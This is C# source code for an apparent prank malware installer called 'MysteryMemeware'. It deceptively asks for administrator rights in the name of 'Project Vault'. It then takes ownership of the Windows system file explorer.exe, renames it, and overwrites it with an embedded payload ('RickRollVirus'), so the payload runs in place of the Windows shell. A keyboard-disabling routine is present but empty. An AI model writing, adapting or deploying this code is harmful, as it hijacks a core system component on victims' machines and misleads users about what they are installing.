using System.IO;
using System.Media;
using System.Reflection;
using System.Diagnostics;
using System;
using System.Threading;
using System.Security.Principal;
using System.Windows.Forms;

namespace MysteryMemeware
{
    public static class Installer
    {
        public static void Main()
        {
            if (IsInstalled())
            {
                StartInstalled();
                Process.GetCurrentProcess().Kill();
            }
            else if (IsAdmin())
            {
                Install();
                StartInstalled();
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                BegForAdmin();
            }
        }
        public static bool IsInstalled()
        {
            FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo(@"C:\Windows\explorer.exe");
            return myFileVersionInfo.FileDescription != "Windows Explorer";
        }
        public static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void BegForAdmin()
        {
            DialogResult dialogResult = MessageBox.Show($"Administrator is required to install or uninstall Project Vault. Please select yes on the following prompt or you are uncomfortable you may press cancel.", $"Administrator Requested.", MessageBoxButtons.OKCancel);
            if (dialogResult == DialogResult.Cancel)
            {
                Process.GetCurrentProcess().Kill();
            }
            else if (dialogResult == DialogResult.OK)
            {
                try
                {
                    RestartAsAdmin();
                }
                catch
                {
                    MessageBox.Show($"Could not install or uninstall Project Vault due to missing permissions.", $"Missing Permissions.", MessageBoxButtons.OK);
                }
            }
        }
        public static void RestartAsAdmin()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo(Assembly.GetCallingAssembly().Location);
            processStartInfo.Verb = "runas";
            Process.Start(processStartInfo);
            Process.GetCurrentProcess().Kill();
        }
        public static void Install()
        {
            DisableKeyboard();
            RenameExplorer();
            InjectPayload();
        }
        public static void DisableKeyboard()
        {

        }
        public static void RenameExplorer()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Windows\System32\cmd.exe");
            processStartInfo.Verb = "runas";
            processStartInfo.Arguments = @"/c takeown /f ""C:\Windows\explorer.exe"" && icacls ""C:\Windows\explorer.exe"" /grant administrators:F";
            Process cmdProcess = Process.Start(processStartInfo);
            while (!cmdProcess.HasExited)
            {
                Thread.Sleep(500);
            }
            File.Move(@"C:\Windows\explorer.exe", @"C:\Windows\explorerBackup.exe");
        }
        public static void InjectPayload()
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            Stream payloadStream = assembly.GetManifestResourceStream("RickRollVirus.Installer.Payload.exe");
            byte[] payloadBytes = new byte[payloadStream.Length];
            payloadStream.Read(payloadBytes, 0, (int)payloadStream.Length);
            payloadStream.Dispose();
            File.WriteAllBytes(@"C:\Windows\explorer.exe", payloadBytes);
        }
        public static void StartInstalled()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Windows\explorer.exe");
            Process.Start(processStartInfo);
        }
    }
}